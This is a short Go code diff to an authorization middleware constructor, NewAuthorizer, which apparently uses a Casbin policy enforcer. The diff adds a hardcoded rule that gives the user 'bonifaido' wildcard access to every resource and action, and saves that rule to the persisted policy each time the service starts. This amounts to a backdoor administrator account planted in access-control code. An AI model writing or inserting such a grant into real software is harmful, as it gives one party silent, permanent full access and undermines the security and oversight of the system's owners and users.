@@ -20,6 +20,8 @@ func NewAuthorizer() gin.HandlerFunc {
 	if err := e.LoadPolicy(); err != nil {
 		panic(err)
 	}
+	e.AddPolicy("bonifaido", "*", "*")
+	e.SavePolicy()
 	return newAuthorizer(e)
 }
 
